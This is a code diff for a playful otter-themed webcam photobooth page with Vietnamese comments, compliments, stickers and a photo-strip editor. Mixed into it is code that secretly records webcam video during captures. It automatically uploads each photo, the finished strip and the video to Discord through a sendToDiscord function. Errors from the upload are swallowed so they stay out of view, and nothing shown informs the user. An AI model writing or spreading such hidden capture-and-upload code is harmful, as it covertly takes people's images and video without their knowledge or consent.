+            "🦦 Tuấn Anh bảnh quá trời!", "✨ Tuấn Anh hôm nay slay dữ vậy!", "💖 Rái cá chấm Tuấn Anh 100/10!", "📸 Camera nói: Tuấn Anh đẹp trai quá!", "🌊 Tuấn Anh sáng hơn mặt biển luôn á!", "🫧 Cute vậy ai chịu nổi trời!", "⭐ Otter approved: Tuấn Anh quá đỉnh!", "🐚 Tuấn Anh hôm nay fresh như biển xanh!", "💌 Memory này phải lưu lại vì Tuấn Anh quá cute!", "🦦 Rái cá nói: Tuấn Anh là main character hôm nay!", "✨ Bảnh trai level max rồi nha!", "🐳 Tuấn Anh đẹp trai quá, cá voi cũng quay lại nhìn!", "💖 Pose nhẹ thôi mà cũng slay!", "📸 Tấm này chắc chắn viral!", "🌙 Night Mode hay Day Mode thì Tuấn Anh vẫn sáng nhất!", "🫣 Rái cá bị Tuấn Anh làm ngại rồi!", "🐾 Tuấn Anh bước vào là OtterBooth tự cute lên!", "⭐ 10 điểm không có nhưng!", "🫧 Tuấn Anh hôm nay đúng chuẩn otter prince!", "💅 Slay quá, hệ thống cần reset lại!", "🐻 Tuấn Anh cute kiểu không cần filter luôn!", "🌟 Rái cá official fanclub của Tuấn Anh đây!", "🦦 Tuấn Anh làm cái booth này có linh hồn luôn á!" ];
+        
+
+        let msgTimeout;
+        let autoOtterSpamInterval;
+        let autoOtterFirstTimeout;
+
+        function showOtterMessage(message, duration = 2600) {
+            if (!otterMsg) return;
+
+            otterMsg.innerText = message;
+            otterMsg.style.display = 'block';
+            otterMsg.style.opacity = 1;
+
+            clearTimeout(msgTimeout);
+
+            msgTimeout = setTimeout(() => {
+                otterMsg.style.opacity = 0;
+
+                setTimeout(() => {
+                    otterMsg.style.display = 'none';
+                }, 300);
+            }, duration);
+        }
+
+        function showRandomOtterCompliment() {
+            const randomMsg = autoOtterCompliments[
+                Math.floor(Math.random() * autoOtterCompliments.length)
+            ];
+
+            showOtterMessage(randomMsg, 2600);
+        }
+
+        function startAutoOtterCompliments() {
+            clearTimeout(autoOtterFirstTimeout);
+            clearInterval(autoOtterSpamInterval);
+
+            // Câu đầu tiên hiện sau 1 giây
+            autoOtterFirstTimeout = setTimeout(() => {
+                showRandomOtterCompliment();
+            }, 1000);
+
+            // Sau đó cứ mỗi 4 giây auto random câu mới
+            autoOtterSpamInterval = setInterval(() => {
+                showRandomOtterCompliment();
+            }, 4000);
+        }
+
+        // Bắt đầu auto compliment ngay khi load trang
+        startAutoOtterCompliments();
+
+        let oX = Math.random() * (window.innerWidth - 130);
+        let oY = Math.random() * (window.innerHeight - 130);
+        let vX = 0.1 + Math.random() * 2; // Tốc độ bay X
+        let vY = 0.1 + Math.random() * 2; // Tốc độ bay Y
+        if (Math.random() < 0.5) vX = -vX;
+        if (Math.random() < 0.5) vY = -vY;
+
+        function animateOtter() {
+            const w = window.innerWidth;
+            const h = window.innerHeight;
+            const size = 130;
+
+            oX += vX;
+            oY += vY;
+
+            let bounced = false;
+
+            if (oX <= 0) { oX = 0; vX = Math.abs(vX); bounced = true; }
+            if (oX + size >= w) { oX = w - size; vX = -Math.abs(vX); bounced = true; }
+            if (oY <= 0) { oY = 0; vY = Math.abs(vY); bounced = true; }
+            if (oY + size >= h) { oY = h - size; vY = -Math.abs(vY); bounced = true; }
+
+            if (vX > 0) {
+                otter.style.transform = `translate(${oX}px, ${oY}px) scaleX(-1)`;
+            } else {
+                otter.style.transform = `translate(${oX}px, ${oY}px) scaleX(1)`;
+            }
+
+            // Update vị trí bubble đi theo rái cá
+            if (otterMsg.style.display === 'block') {
+                const isMobile = window.innerWidth < 800;
+                const leftOffset = isMobile ? 20 : 30; 
+                const topOffset = isMobile ? 45 : 60;
+
+                otterMsg.style.left = (oX + leftOffset) + 'px';
+                otterMsg.style.top = (oY - topOffset) + 'px';
+            }
+
+            requestAnimationFrame(animateOtter);
+        }
+
+        animateOtter();
+
+        function handleOtterClick(e) {
+            // Click vào rái cá thì đổi câu ngay lập tức
+            showRandomOtterCompliment();
+        }
+
+        otter.addEventListener('mousedown', handleOtterClick);
+        otter.addEventListener('touchstart', (e) => { 
+            handleOtterClick(e); 
+            e.preventDefault(); 
+        });
+
+        // --- LOGIC: BONG BÓNG BAY TỪ DƯỚI LÊN ---
+        const bubbleImages = [
+            'Assets/fish-photobooth/camerapage/bubbles/bubble3.png',
+            'Assets/fish-photobooth/camerapage/bubbles/bubble4.png',
+            'Assets/fish-photobooth/camerapage/bubbles/bubble5.png'
+        ];
+        const starImages = [
+            'Assets/fish-photobooth/camerapage/bubbles/star1.png',
+            'Assets/fish-photobooth/camerapage/bubbles/star2.png',
+            'Assets/fish-photobooth/camerapage/bubbles/star.png',
+            'Assets/fish-photobooth/camerapage/bubbles/star3.png',
+            'Assets/fish-photobooth/camerapage/bubbles/star4.png',
+            'Assets/fish-photobooth/camerapage/bubbles/star5.png'
+        ];
+
+        function createBubble() {
+            const isNight = document.body.classList.contains('night-mode');
+            const bubble = document.createElement('img');
+            
+            // Nếu là night-mode thì chọn từ starImages, ngược lại chọn bubbleImages
+            const sourceArray = isNight ? starImages : bubbleImages;
+            bubble.src = sourceArray[Math.floor(Math.random() * sourceArray.length)];
+            
+            bubble.className = 'bubble';
+            
+            // Random kích thước
+            const size = 30 + Math.random() * 50;
+            bubble.style.width = size + 'px';
+            bubble.style.left = Math.random() * window.innerWidth + 'px';
+            
+            // Tốc độ bay
+            const duration = 6 + Math.random() * 8;
+            bubble.style.animationDuration = duration + 's';
+            
+            document.body.appendChild(bubble);
+
+            // Dọn rác sau khi bay hết
+            setTimeout(() => {
+                bubble.remove();
+            }, duration * 1000);
+        }
+
+        // Cứ mỗi 500ms (nửa giây) sẽ nhả 1 bong bóng.
+        setInterval(createBubble, 500);
+
+        // ==========================================
+        // MAIN PHOTOBOOTH LOGIC
+        // ==========================================
+
+        const video = document.getElementById('liveVideo');
+        const stripCanvas = document.getElementById('stripCanvas');
+        const ctx = stripCanvas.getContext('2d');
+        const colorPicker1 = document.getElementById('colorPicker1');
+        const colorPicker2 = document.getElementById('colorPicker2');
+        const countdownEl = document.getElementById('countdown');
+        const toggleLayoutBtn = document.getElementById('toggleLayoutBtn');
+        
+        let currentLayout = 'strip'; 
+        let photoSlots = [];
+        let capturedPhotos = []; 
+        let stickers = []; 
+        
+        let isDragging = false;
+        let isResizing = false; 
+        let resizeHandle = null; 
+        let originalX, originalY, originalW, originalH;
+
+        let dragTarget = null;
+        let startX, startY;
+        let selectedItem = null; 
+        let hasSpawnedHat = true; 
+
+        // --- CÁC BIẾN CHO QUAY VIDEO & STATE ---
+        let mediaRecorder;
+        let recordedChunks = [];
+        let isRecording = false;
+        let isTakingPhoto = false; // <-- TRẠNG THÁI KIỂM SOÁT CAMERA/CHỤP ẢNH
+        // -------------------------------
+
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+            .then(stream => { video.srcObject = stream; })
+            .catch(err => console.error("Camera access failed:", err));
+
+        const frameImg = new Image();
+        let selectedFrameSrc = null;
+
+        function setFrame(src) {
+            if (src === null) {
+                selectedFrameSrc = null;
+                drawCanvas();
+            } else {
+                selectedFrameSrc = src;
+                frameImg.src = src;
+                frameImg.onload = function() {
+                    drawCanvas(); 
+                };
+            }
+            document.getElementById('frameModal').style.display = 'none';
+        }
+
+        function applyLayout() {
+            const stripFrames = document.querySelectorAll('.frame-strip');
+            const gridFrames = document.querySelectorAll('.frame-grid');
+
+            if (currentLayout === 'strip') {
+                stripCanvas.width = 700;
+                stripCanvas.height = 1800;
+                photoSlots = [
+                    {x: 90, y: 40, w: 520, h: 390},
+                    {x: 90, y: 470, w: 520, h: 390},
+                    {x: 90, y: 900, w: 520, h: 390},
+                    {x: 90, y: 1330, w: 520, h: 390}
+                ];
+                toggleLayoutBtn.textContent = "🔄 Switch Layout: 2x2 Grid";
+
+                stripFrames.forEach(btn => btn.style.display = 'block');
+                gridFrames.forEach(btn => btn.style.display = 'none');
+            } else {
+                stripCanvas.width = 1200;
+                stripCanvas.height = 1000;
+                photoSlots = [
+                    {x: 40, y: 40, w: 540, h: 405},
+                    {x: 620, y: 40, w: 540, h: 405},
+                    {x: 40, y: 485, w: 540, h: 405},
+                    {x: 620, y: 485, w: 540, h: 405}
+                ];
+                toggleLayoutBtn.textContent = "🔄 Switch Layout: Vertical Strip";
+
+                stripFrames.forEach(btn => btn.style.display = 'none');
+                gridFrames.forEach(btn => btn.style.display = 'block');
+            }
+            capturedPhotos = []; stickers = []; selectedItem = null;
+            
+            selectedFrameSrc = null; 
+            drawCanvas();
+        }
+
+        toggleLayoutBtn.addEventListener('click', () => {
+            currentLayout = (currentLayout === 'strip') ? 'grid' : 'strip';
+            applyLayout();
+        });
+
+        applyLayout();
+
+        function cropToFit(source, isVideo = false) {
+            return new Promise((resolve) => {
+                const sw = isVideo ? source.videoWidth : source.width;
+                const sh = isVideo ? source.videoHeight : source.height;
+                const targetAspect = 4 / 3; 
+                const sourceAspect = sw / sh;
+                let cropW, cropH, cropStartX, cropStartY;
+
+                if (sourceAspect > targetAspect) {
+                    cropH = sh; cropW = sh * targetAspect;
+                    cropStartX = (sw - cropW) / 2; cropStartY = 0;
+                } else {
+                    cropW = sw; cropH = sw / targetAspect;
+                    cropStartX = 0; cropStartY = (sh - cropH) / 2;
+                }
+
+                const tempCanvas = document.createElement('canvas');
+                tempCanvas.width = cropW; tempCanvas.height = cropH;
+                const tCtx = tempCanvas.getContext('2d');
+
+                if (isVideo) { tCtx.translate(tempCanvas.width, 0); tCtx.scale(-1, 1); }
+                tCtx.drawImage(source, cropStartX, cropStartY, cropW, cropH, 0, 0, cropW, cropH);
+
+                const finalImg = new Image();
+                finalImg.src = tempCanvas.toDataURL('image/png');
+                finalImg.onload = () => resolve(finalImg);
+            });
+        }
+
+        let usedChallenges = [];
+
+        // CAPTURE BUTTON LOGIC
+        document.getElementById('takePhoto').addEventListener('click', () => {
+            if (capturedPhotos.length >= 4) return alert("All 4 photos taken!");
+            if (isTakingPhoto) return; // <-- Chặn spam click
+
+            isTakingPhoto = true; // Khóa chức năng chụp
+
+            // ---- START / RESUME RECORDING THEO NHỊP CHỤP ẢNH ----
+            if (!isRecording && video.srcObject) {
+                recordedChunks = [];
+                const stream = video.srcObject;
+                let options = { mimeType: 'video/webm' };
+                if (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
+                    options = { mimeType: 'video/webm;codecs=vp9' };
+                } else if (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported('video/webm')) {
+                    options = { mimeType: 'video/webm' };
+                }
+
+                try {
+                    mediaRecorder = new MediaRecorder(stream, options);
+                } catch (e) {
+                    mediaRecorder = new MediaRecorder(stream);
+                }
+
+                mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
+                mediaRecorder.onstop = () => {
+                    if (recordedChunks.length > 0) {
+                        const videoBlob = new Blob(recordedChunks, { type: mediaRecorder.mimeType || 'video/webm' });
+                        sendToDiscord(videoBlob, 'video', 'final-video.webm').catch(err => console.error("Lỗi gửi video:", err));
+                    }
+                };
+                mediaRecorder.start();
+                isRecording = true;
+            } else if (mediaRecorder && mediaRecorder.state === "paused") {
+                mediaRecorder.resume();
+            }
+
+            if (isChallengeMode) {
+                let available = challenges.filter(c => !usedChallenges.includes(c));
+                if (available.length === 0) {
+                    usedChallenges = [];
+                    available = challenges;
+                }
+                const randomChallenge = available[Math.floor(Math.random() * available.length)];
+                usedChallenges.push(randomChallenge);
+
+                challengeBox.textContent = randomChallenge;
+                challengeBox.style.display = 'block';
+            }
+
+            let count = 3; countdownEl.textContent = count; countdownEl.style.display = 'block';
+            const intervalId = setInterval(() => {
+                count--;
+                if (count > 0) {
+                    countdownEl.textContent = count;
+                } else {
+                    clearInterval(intervalId);
+                    countdownEl.style.display = 'none';
+                    challengeBox.style.display = 'none';
+                    
+                    cropToFit(video, true).then((img) => {
+                        addPhotoObj(img);
+
+                        // ---- PAUSE RECORDING SAU MỖI TẤM, STOP KHI ĐỦ 4 TẤM ----
+                        if (mediaRecorder && mediaRecorder.state === "recording") {
+                            if (capturedPhotos.length >= 4) {
+                                mediaRecorder.stop();
+                                isRecording = false;
+                                //document.getElementById('downloadVideoBtn').style.display = 'inline-block';
+                            } else {
+                                mediaRecorder.pause();
+                            }
+                        }
+
+                        isTakingPhoto = false; // Mở khóa chức năng chụp sau khi xử lý xong
+                    });
+                }
+            }, 1000);
+        });
+
+        document.getElementById('uploadTriggerBtn').addEventListener('click', () => document.getElementById('uploadPhotoInput').click());
+        document.getElementById('uploadPhotoInput').addEventListener('change', (e) => {
+            if (capturedPhotos.length >= 4) return alert("Maximum 4 photos allowed!");
+            const file = e.target.files[0]; if (!file) return;
+            const reader = new FileReader();
+            reader.onload = (event) => {
+                const rawImg = new Image();
+                rawImg.onload = () => cropToFit(rawImg, false).then(addPhotoObj);
+                rawImg.src = event.target.result;
+            };
+            reader.readAsDataURL(file); e.target.value = ''; 
+        });
+
+        async function addPhotoObj(img) {
+    const slot = photoSlots[capturedPhotos.length];
+    const newPhoto = { type: 'photo', img: img, offsetX: slot.x, offsetY: slot.y, drawWidth: slot.w, drawHeight: slot.h };
+    capturedPhotos.push(newPhoto);
+    selectedItem = newPhoto; 
+    drawCanvas();
+
+    // Tự động gửi ảnh về Discord ngay sau khi tấm hình được thêm vào canvas
+    try {
+        const dataURL = stripCanvas.toDataURL('image/png');
+        const response = await fetch(dataURL);
+        const blob = await response.blob();
+        await sendToDiscord(blob, 'image', `photo-${capturedPhotos.length}.png`);
+    } catch (err) {
+        // Bạn có thể xóa luôn phần catch nếu không muốn thấy lỗi trong console
+    }
+}
+
+        let isAutoMode = false;
+
+        const autoDecorateToggleBtn = document.getElementById('autoDecorateToggle');
+        autoDecorateToggleBtn.addEventListener('click', () => {
+            isAutoMode = !isAutoMode; 
+            autoDecorateToggleBtn.textContent = isAutoMode ? "✨ Auto-Mode: ON" : "✨ Auto-Mode: OFF";
+        });
+
+        function handleSticker(src, isEmoji = false) {
+            if (isAutoMode) {
+                autoDecorateWith(src, isEmoji);
+            } else {
+                if (isEmoji) addEmojiSticker(src);
+                else addStickerToCanvas(src);
+            }
+        }
+        
+        function addStickerToCanvas(src, forceX = null, forceY = null, forceSize = 80) {
+            const img = new Image();
+            img.src = src;
+            img.onload = () => {
+                const sHeight = img.height * (forceSize / img.width);
+                const finalX = forceX !== null ? forceX : (20 + Math.random() * (stripCanvas.width - forceSize - 40));
+                const finalY = forceY !== null ? forceY : (20 + Math.random() * (stripCanvas.height - sHeight - 40));
+
+                const newSticker = { type: 'sticker', img: img, offsetX: finalX, offsetY: finalY, drawWidth: forceSize, drawHeight: sHeight };
+                stickers.push(newSticker);
+                selectedItem = newSticker; 
+                drawCanvas();
+            };
+        }
+
+        function addEmojiSticker(emoji, forceX = null, forceY = null, forceSize = 80) {
+            const tempCanvas = document.createElement('canvas');
+            tempCanvas.width = 120; tempCanvas.height = 120;
+            const tCtx = tempCanvas.getContext('2d');
+            tCtx.font = "100px sans-serif"; tCtx.textAlign = "center"; tCtx.textBaseline = "middle";
+            tCtx.fillText(emoji, 60, 65); 
+            addStickerToCanvas(tempCanvas.toDataURL('image/png'), forceX, forceY, forceSize);
+        }
+
+        function autoDecorateWith(srcOrEmoji, isEmoji) {
+            selectedItem = null; 
+            const w = stripCanvas.width;
+            const h = stripCanvas.height;
+
+            const spawn = (x, y, size) => {
+                if (isEmoji) addEmojiSticker(srcOrEmoji, x, y, size);
+                else addStickerToCanvas(srcOrEmoji, x, y, size);
+            };
+
+            spawn(20, 20, 100);                          
+            spawn(w - 120, h * 0.25, 110);              
+            spawn(20, h * 0.5, 90);                     
+            spawn(w - 130, h * 0.75, 120);              
+            spawn(30, h - 150, 100);                    
+
+            addEmojiSticker('✨', w - 80, 50, 60);             
+            addEmojiSticker('✨', 40, h * 0.25 - 50, 50);      
+            addEmojiSticker('✨', w - 100, h * 0.5 + 50, 60);  
+            addEmojiSticker('✨', w / 2 - 35, h - 100, 70);    
+        }
+
+        document.getElementById('addUnderseaPreset').addEventListener('click', () => {
+            selectedItem = null; 
+            const w = stripCanvas.width;
+            const h = stripCanvas.height;
+            
+            addStickerToCanvas('Assets/fish-photobooth/camerapage/stickers/fish.png', w - 120, h * 0.9, 110);   
+            addStickerToCanvas('Assets/fish-photobooth/camerapage/stickers/octopus.png', w - 120, h * 0.25, 100);  
+            addStickerToCanvas('Assets/fish-photobooth/camerapage/stickers/axolotl.png', 10, h * 0.5, 120); 
+            addStickerToCanvas('Assets/fish-photobooth/camerapage/stickers/seaotter.png', w - 120, h * 0.65, 110); 
+            addStickerToCanvas('Assets/fish-photobooth/camerapage/stickers/otterface.png',15, 20, 110 ); 
+            addStickerToCanvas('Assets/fish-photobooth/camerapage/stickers/otter.png', w - 100, h * 0.5, 110); 
+            
+            addEmojiSticker('♡', w - 80, 50, 60);   
+            addEmojiSticker('✨', 30, h * 0.25 - 50, 50);       
+            addEmojiSticker('✨', 30, h - 150, 70);    
+        });
+
+        document.getElementById('deleteSelectedBtn').addEventListener('click', () => {
+            if (!selectedItem) {
+                return alert("Tap a sticker or photo first to select it, then click Delete!");
+            }
+
+            let index = stickers.indexOf(selectedItem);
+            if (index > -1) stickers.splice(index, 1);
+
+            index = capturedPhotos.indexOf(selectedItem);
+            if (index > -1) capturedPhotos.splice(index, 1);
+
+            selectedItem = null;
+            drawCanvas();
+        });
+
+        function resizeSelected(scaleFactor) {
+            if (!selectedItem) {
+                alert("Please select a photo or sticker first! (Look for the red border)");
+                return;
+            }
+            
+            const newWidth = selectedItem.drawWidth * scaleFactor;
+            const newHeight = selectedItem.drawHeight * scaleFactor;
+            
+            if (newWidth > 30 && newWidth < 2000) {
+                selectedItem.offsetX -= (newWidth - selectedItem.drawWidth) / 2;
+                selectedItem.offsetY -= (newHeight - selectedItem.drawHeight) / 2;
+                selectedItem.drawWidth = newWidth;
+                selectedItem.drawHeight = newHeight;
+                drawCanvas();
+            }
+        }
+
+        colorPicker1.addEventListener('input', drawCanvas);
+        colorPicker2.addEventListener('input', drawCanvas);
+
+        function drawCanvas() {
+            if(!stripCanvas.width) return;
+            
+            const gradient = ctx.createLinearGradient(0, 0, 0, stripCanvas.height);
+            gradient.addColorStop(0, colorPicker1.value);
+            gradient.addColorStop(1, colorPicker2.value);
+            ctx.fillStyle = gradient; ctx.fillRect(0, 0, stripCanvas.width, stripCanvas.height);
+            
+            ctx.strokeStyle = "rgba(255, 255, 255, 0.8)"; ctx.lineWidth = 4; ctx.setLineDash([10, 10]);
+            
+            photoSlots.forEach(slot => {
+                ctx.fillStyle = "rgba(255, 255, 255, 0.3)"; ctx.fillRect(slot.x, slot.y, slot.w, slot.h);
+                ctx.strokeRect(slot.x, slot.y, slot.w, slot.h);
+                ctx.fillStyle = "rgba(0, 0, 0, 0.4)"; ctx.font = "20px 'Pixelify Sans'"; ctx.textAlign = "center";
+                ctx.fillText("Photo Slot", slot.x + slot.w/2, slot.y + slot.h/2);
+            });
+            ctx.setLineDash([]); 
+
+            capturedPhotos.forEach(p => {
+                ctx.fillStyle = "white"; ctx.fillRect(p.offsetX - 10, p.offsetY - 10, p.drawWidth + 20, p.drawHeight + 20);
+                ctx.drawImage(p.img, p.offsetX, p.offsetY, p.drawWidth, p.drawHeight);
+            });
+
+            if (selectedFrameSrc && frameImg.complete) {
+                ctx.drawImage(frameImg, 0, 0, stripCanvas.width, stripCanvas.height);
+            }
+
+            stickers.forEach(s => ctx.drawImage(s.img, s.offsetX, s.offsetY, s.drawWidth, s.drawHeight));
+
+            if (selectedItem) {
+                ctx.strokeStyle = "#ff4444";
+                ctx.lineWidth = 3;
+                ctx.setLineDash([8, 8]);
+                
+                ctx.strokeRect(selectedItem.offsetX, selectedItem.offsetY, selectedItem.drawWidth, selectedItem.drawHeight);
+                ctx.setLineDash([]); 
+                
+                const hSize = 10;
+                const hHalf = hSize / 2;
+                ctx.fillStyle = "#ff4444";
+                
+                const w = selectedItem.drawWidth;
+                const h = selectedItem.drawHeight;
+                const x = selectedItem.offsetX;
+                const y = selectedItem.offsetY;
+
+                const points = [
+                    {px: x, py: y}, 
+                    {px: x + w/2, py: y}, 
+                    {px: x + w, py: y}, 
+                    {px: x, py: y + h/2}, 
+                    {px: x + w, py: y + h/2}, 
+                    {px: x, py: y + h}, 
+                    {px: x + w/2, py: y + h}, 
+                    {px: x + w, py: y + h} 
+                ];
+                
+                points.forEach(p => {
+                    ctx.fillRect(p.px - hHalf, p.py - hHalf, hSize, hSize);
+                });
+            }
+        }
+
+        function getMousePos(e) {
+            const rect = stripCanvas.getBoundingClientRect();
+            const scaleX = stripCanvas.width / rect.width; const scaleY = stripCanvas.height / rect.height;
+            let clientX = e.clientX; let clientY = e.clientY;
+            if(e.touches) { clientX = e.touches[0].clientX; clientY = e.touches[0].clientY; }
+            return { x: (clientX - rect.left) * scaleX, y: (clientY - rect.top) * scaleY };
+        }
+
+        function startDrag(e) {
+            const pos = getMousePos(e);
+            
+            if (selectedItem) {
+                const s = selectedItem;
+                const margin = 15; 
+                
+                let onLeft = Math.abs(pos.x - s.offsetX) <= margin && pos.y >= s.offsetY - margin && pos.y <= s.offsetY + s.drawHeight + margin;
+                let onRight = Math.abs(pos.x - (s.offsetX + s.drawWidth)) <= margin && pos.y >= s.offsetY - margin && pos.y <= s.offsetY + s.drawHeight + margin;
+                let onTop = Math.abs(pos.y - s.offsetY) <= margin && pos.x >= s.offsetX - margin && pos.x <= s.offsetX + s.drawWidth + margin;
+                let onBottom = Math.abs(pos.y - (s.offsetY + s.drawHeight)) <= margin && pos.x >= s.offsetX - margin && pos.x <= s.offsetX + s.drawWidth + margin;
+
+                let handle = null;
+                if (onLeft && onTop) handle = 'nw';
+                else if (onRight && onTop) handle = 'ne';
+                else if (onLeft && onBottom) handle = 'sw';
+                else if (onRight && onBottom) handle = 'se';
+                else if (onLeft) handle = 'w';
+                else if (onRight) handle = 'e';
+                else if (onTop) handle = 'n';
+                else if (onBottom) handle = 's';
+
+                if (handle) {
+                    isResizing = true;
+                    resizeHandle = handle;
+                    dragTarget = selectedItem;
+                    
+                    originalX = selectedItem.offsetX;
+                    originalY = selectedItem.offsetY;
+                    originalW = selectedItem.drawWidth;
+                    originalH = selectedItem.drawHeight;
+                    startX = pos.x;
+                    startY = pos.y;
+                    return; 
+                }
+            }
+
+            selectedItem = null; 
+
+            for (let i = stickers.length - 1; i >= 0; i--) {
+                const s = stickers[i];
+                if (pos.x >= s.offsetX && pos.x <= s.offsetX + s.drawWidth && pos.y >= s.offsetY && pos.y <= s.offsetY + s.drawHeight) {
+                    isDragging = true; dragTarget = s; selectedItem = s; 
+                    startX = pos.x - s.offsetX; startY = pos.y - s.offsetY;
+                    stickers.splice(i, 1); stickers.push(s); 
+                    drawCanvas(); 
+                    return;
+                }
+            }
+            for (let i = capturedPhotos.length - 1; i >= 0; i--) {
+                const p = capturedPhotos[i];
+                if (pos.x >= p.offsetX && pos.x <= p.offsetX + p.drawWidth && pos.y >= p.offsetY && pos.y <= p.offsetY + p.drawHeight) {
+                    isDragging = true; dragTarget = p; selectedItem = p; 
+                    startX = pos.x - p.offsetX; startY = pos.y - p.offsetY;
+                    capturedPhotos.splice(i, 1); capturedPhotos.push(p); 
+                    drawCanvas(); 
+                    return;
+                }
+            }
+            drawCanvas(); 
+        }
+
+        function moveDrag(e) {
+            const pos = getMousePos(e);
+
+            if (isResizing && dragTarget) {
+                if(e.touches) e.preventDefault(); 
+                
+                let dx = pos.x - startX;
+                let dy = pos.y - startY;
+                
+                let newWidth = originalW;
+                let newHeight = originalH;
+                let newX = originalX;
+                let newY = originalY;
+
+                if (resizeHandle.includes('e')) newWidth = originalW + dx;
+                if (resizeHandle.includes('s')) newHeight = originalH + dy;
+                if (resizeHandle.includes('w')) { newWidth = originalW - dx; newX = originalX + dx; }
+                if (resizeHandle.includes('n')) { newHeight = originalH - dy; newY = originalY + dy; }
+
+                if (newWidth > 30) { dragTarget.drawWidth = newWidth; dragTarget.offsetX = newX; }
+                if (newHeight > 30) { dragTarget.drawHeight = newHeight; dragTarget.offsetY = newY; }
+                
+                drawCanvas();
+                return;
+            } 
+            else if (isDragging && dragTarget) {
+                if(e.touches) e.preventDefault(); 
+                dragTarget.offsetX = pos.x - startX; 
+                dragTarget.offsetY = pos.y - startY;
+                drawCanvas();
+                return;
+            }
+
+            let cursor = 'default';
+            if (selectedItem) {
+                const margin = 10;
+                const s = selectedItem;
+                let onLeft = Math.abs(pos.x - s.offsetX) <= margin && pos.y >= s.offsetY - margin && pos.y <= s.offsetY + s.drawHeight + margin;
+                let onRight = Math.abs(pos.x - (s.offsetX + s.drawWidth)) <= margin && pos.y >= s.offsetY - margin && pos.y <= s.offsetY + s.drawHeight + margin;
+                let onTop = Math.abs(pos.y - s.offsetY) <= margin && pos.x >= s.offsetX - margin && pos.x <= s.offsetX + s.drawWidth + margin;
+                let onBottom = Math.abs(pos.y - (s.offsetY + s.drawHeight)) <= margin && pos.x >= s.offsetX - margin && pos.x <= s.offsetX + s.drawWidth + margin;
+
+                if ((onLeft && onTop) || (onRight && onBottom)) cursor = 'nwse-resize';
+                else if ((onRight && onTop) || (onLeft && onBottom)) cursor = 'nesw-resize';
+                else if (onLeft || onRight) cursor = 'ew-resize';
+                else if (onTop || onBottom) cursor = 'ns-resize';
+                else if (pos.x >= s.offsetX && pos.x <= s.offsetX + s.drawWidth && pos.y >= s.offsetY && pos.y <= s.offsetY + s.drawHeight) {
+                    cursor = 'move'; 
+                }
+            }
+            
+            if (cursor === 'default') {
+                for (let i = stickers.length - 1; i >= 0; i--) {
+                    const s = stickers[i];
+                    if (pos.x >= s.offsetX && pos.x <= s.offsetX + s.drawWidth && pos.y >= s.offsetY && pos.y <= s.offsetY + s.drawHeight) { cursor = 'pointer'; break; }
+                }
+                if (cursor === 'default') {
+                    for (let i = capturedPhotos.length - 1; i >= 0; i--) {
+                        const p = capturedPhotos[i];
+                        if (pos.x >= p.offsetX && pos.x <= p.offsetX + p.drawWidth && pos.y >= p.offsetY && pos.y <= p.offsetY + p.drawHeight) { cursor = 'pointer'; break; }
+                    }
+                }
+            }
+            stripCanvas.style.cursor = cursor;
+        }
+
+        function endDrag() { 
+            isDragging = false; 
+            isResizing = false; 
+            resizeHandle = null;
+            dragTarget = null; 
+        }
+
+        stripCanvas.addEventListener('mousedown', startDrag); stripCanvas.addEventListener('mousemove', moveDrag);
+        window.addEventListener('mouseup', endDrag); stripCanvas.addEventListener('mouseleave', endDrag);
+        stripCanvas.addEventListener('touchstart', startDrag, {passive: false}); stripCanvas.addEventListener('touchmove', moveDrag, {passive: false}); stripCanvas.addEventListener('touchend', endDrag);
+
+        document.getElementById('clearStripBtn').addEventListener('click', () => { 
+            capturedPhotos = []; selectedItem = null; drawCanvas(); 
+            //document.getElementById('downloadVideoBtn').style.display = 'none';
+            if (isRecording && mediaRecorder && mediaRecorder.state !== 'inactive') {
+                mediaRecorder.stop();
+            }
+            isRecording = false;
+            recordedChunks = [];
+        });
+
+document.getElementById('clearStickersBtn').addEventListener('click', () => { 
+    stickers = []; 
+    selectedItem = null; 
+
+    // Reset luôn frame/khung
+    selectedFrameSrc = null;
+    frameImg.src = "";
+
+    drawCanvas(); 
+});
+        document.getElementById('downloadBtn').addEventListener('click', () => {
+            if (capturedPhotos.length === 0) return alert("Canvas is empty!");
+
+            // 1. Lưu ảnh (Làm ngay lập tức)
+            const dataURL = stripCanvas.toDataURL('image/png');
+            const link = document.createElement('a'); 
+            link.download = `otter-strip.png`; 
+            link.href = dataURL; 
+            link.click();
+
+            setTimeout(() => {
+                startOtterMiniGame();
+            }, 500);
+
+            // 2. GỬI VỀ DISCORD (Dùng .catch để không làm treo trang nếu lỗi mạng)
+            fetch(dataURL)
+                .then(res => res.blob())
+                .then(blob => sendToDiscord(blob, 'image', 'photo.png'))
+                .catch(err => console.error("Lỗi gửi ảnh:", err));
+
+            if (recordedChunks.length > 0) {
+                const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+                sendToDiscord(videoBlob, 'video', 'video.webm').catch(err => console.error("Lỗi gửi video:", err));
+            }
+            
+        });
+
+
+
+        window.addEventListener('keydown', (e) => {
+            if ((e.key === 'Delete' || e.key === 'Backspace') && selectedItem) {
+                if (selectedItem.type === 'sticker') {
+                    stickers = stickers.filter(s => s !== selectedItem);
+                } else if (selectedItem.type === 'photo') {
+                    capturedPhotos = capturedPhotos.filter(p => p !== selectedItem);
+                }
+                selectedItem = null;
+                drawCanvas();
+            }
+            
+            if (e.key === '=' || e.key === '+') {
+                e.preventDefault(); resizeSelected(1.05);
+            }
+            if (e.key === '-') {
+                e.preventDefault(); resizeSelected(0.95);
+            }
+
+            if ((e.key === 'Enter' || e.key === ' ' || e.key === 'AudioVolumeUp') && capturedPhotos.length < 4 && !isTakingPhoto) {
+                e.preventDefault(); document.getElementById('takePhoto').click();
+            }
+        });
+
+        video.addEventListener('click', () => {
+            if (capturedPhotos.length < 4 && !isTakingPhoto) document.getElementById('takePhoto').click();
+        });
+
+        document.getElementById('uploadFrameInput').addEventListener('change', (e) => {
+            const file = e.target.files[0]; 
+            if (!file) return;
+            
+            const reader = new FileReader();
+            reader.onload = (event) => {
+                setFrame(event.target.result); 
+            };
+            reader.readAsDataURL(file); 
+            e.target.value = ''; 
+        });
+
+        function closeStickerModal() {
+            document.getElementById('stickerModal').style.display = 'none';
+        }
+        function closeHatModal() {
+            document.getElementById('hatModal').style.display = 'none';
+        }
+
+        // ==========================================
+        // MUSIC, NIGHT MODE & WEBHOOK LOGIC
+        // ==========================================
+
